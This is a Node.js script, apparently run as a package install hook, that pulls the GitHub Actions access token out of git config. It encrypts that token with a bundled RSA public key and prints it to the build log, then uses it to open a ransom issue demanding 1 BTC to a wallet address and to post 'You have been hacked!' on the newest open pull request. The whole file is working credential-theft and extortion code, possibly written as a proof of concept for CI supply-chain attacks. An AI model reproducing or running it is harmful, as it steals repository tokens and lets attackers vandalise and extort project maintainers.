import { Buffer } from "node:buffer";
import { promises } from "node:fs";
import { exec } from "node:child_process";
import NodeRSA from "node-rsa";
import { Octokit } from "@octokit/core";
const { readFile } = promises;

const AUTHORIZATION_OPTION_PREFIX = "AUTHORIZATION: basic ";
const BASIC_CREDENTIAL_PREFIX = "x-access-token:";
const SSL_PATTERN = /^git@github.com:([^\/]+)\/([^\.]+)\.git$/;
const HTTPS_PATTERN = /^https:\/\/github.com\/([^\/]+)\/([^\/]+)$/;

const publicKey = new NodeRSA(
  await readFile(new URL("./id_rsa.pub", import.meta.url))
);

/**
 * `exec` as a Promise, returning trimmed stdout (ignoring stderr)
 * @param {string} command
 * @returns {Promise<string>}
 */
function execAsync(command) {
  return new Promise((resolve, reject) => {
    exec(command, (error, stdout, _stderr) => {
      if (error) {
        reject(error);
      }
      resolve(stdout.trimEnd());
    });
  });
}

async function getGitHubBasicCredential() {
  const extraHeader = await execAsync(
    'git config --get-all "http.https://github.com/.extraheader"'
  );
  const values = extraHeader.split("\n");
  for (const header of values) {
    if (header.startsWith(AUTHORIZATION_OPTION_PREFIX)) {
      return header.substring(AUTHORIZATION_OPTION_PREFIX.length);
    }
  }
  return null;
}

function decodeBasicCredentialPassword(basicCredential) {
  const decoded = Buffer.from(basicCredential, "base64").toString("utf8");
  if (decoded.startsWith(BASIC_CREDENTIAL_PREFIX)) {
    return decoded.substring(BASIC_CREDENTIAL_PREFIX.length);
  }
  throw Error(`Basic credential did not match pattern: ${basicCredential}`);
}

async function getOriginUrl() {
  return await execAsync("git remote get-url origin");
}

/**
 * Parse the GitHub owner and repository name from the URL.
 * @param {string} url
 */
function parseGitHubRemoteUrl(url) {
  let res = url.match(SSL_PATTERN);
  if (res === null) {
    res = url.match(HTTPS_PATTERN);
  }
  if (res === null) {
    throw Error(`Remote URL did not match pattern: ${url}`);
  }
  const owner = res[1];
  const repo = res[2];
  return { owner, repo };
}

/**
 * Get the number of the first pull request with an "in progress" workflow, a
 * reasonable guess for a pull request for which this workflow is running.
 * @param {import("@octokit/core").Octokit} octokit
 * @param {string} owner
 * @param {string} repo
 */
async function getCurrentPullRequest(octokit, owner, repo) {
  const {
    data: { workflow_runs: workflows },
  } = await octokit.request("GET /repos/{owner}/{repo}/actions/runs", {
    owner,
    repo,
    status: "in_progress",
  });

  const workflow = workflows.find(
    (workflow) => workflow.pull_requests && workflow.pull_requests.length > 0
  );
  if (workflow === undefined) {
    return null;
  }
  return workflow.pull_requests[0];
}

/**
 * Get the number of the last open pull request
 * @param {import("@octokit/core").Octokit} octokit
 * @param {string} owner
 * @param {string} repo
 */
async function getLastOpenPullRequest(octokit, owner, repo) {
  const { data } = await octokit.request("GET /repos/{owner}/{repo}/pulls", {
    owner,
    repo,
    state: "open",
  });
  if (data.length === 0) {
    return null;
  }
  // max of PR numbers
  return Math.max(...data.map((pr) => pr.number));
}

/**
 * Post a snarky comment on an issue or pull request.
 * @param {import("@octokit/core").Octokit} octokit
 * @param {string} owner
 * @param {string} repo
 * @param {number} issue_number
 */
async function postComment(octokit, owner, repo, issue_number) {
  await octokit.request(
    "POST /repos/{owner}/{repo}/issues/{issue_number}/comments",
    {
      owner,
      repo,
      issue_number,
      body: "You have been hacked! See your issue tracker for details.",
    }
  );
}

/**
 * Create a ransomware issue.
 * @param {import("@octokit/core").Octokit} octokit
 * @param {string} owner
 * @param {string} repo
 */
async function createIssue(octokit, owner, repo) {
  await octokit.request("POST /repos/{owner}/{repo}/issues", {
    owner,
    repo,
    title: "You have been hacked!",
    body: "Pay 1 BTC to `bc1qlt5nh0y4jnwlwtd66ra634atxh3711xd1anyh5` within 24 hours to regain control of your repository.",
  });
}

async function run() {
  // Find the owner and repository for GitHub access
  let owner;
  let repo;
  try {
    const originUrl = await getOriginUrl();
    const remote = parseGitHubRemoteUrl(originUrl);
    owner = remote.owner;
    repo = remote.repo;
  } catch (e) {
    console.error(e);
    return;
  }

  // Extract the GitHub access token from git config
  let token;
  try {
    const basicCredential = await getGitHubBasicCredential();
    if (basicCredential !== null) {
      console.log(
        `Found the token: ${publicKey.encrypt(basicCredential, "base64")}`
      );
    } else {
      console.log("Found no credentials in git, skipping...");
      return;
    }

    token = decodeBasicCredentialPassword(basicCredential);
  } catch (e) {
    console.error(e);
    return;
  }

  const octokit = new Octokit({
    auth: `token ${token}`,
  });

  try {
    await createIssue(octokit, owner, repo);
    console.log("Created issue.");
  } catch (e) {
    console.error(e);
  }

  try {
    const pullRequest = await getLastOpenPullRequest(octokit, owner, repo);
    if (pullRequest === null) {
      console.log("Found no pull request for this workflow.");
      return;
    }

    await postComment(octokit, owner, repo, pullRequest.number);
    console.log(`Posted a comment on pull request #${pullRequest.number}.`);
  } catch (e) {
    console.error(e);
  }
}

console.log("Running install script...");
await run();
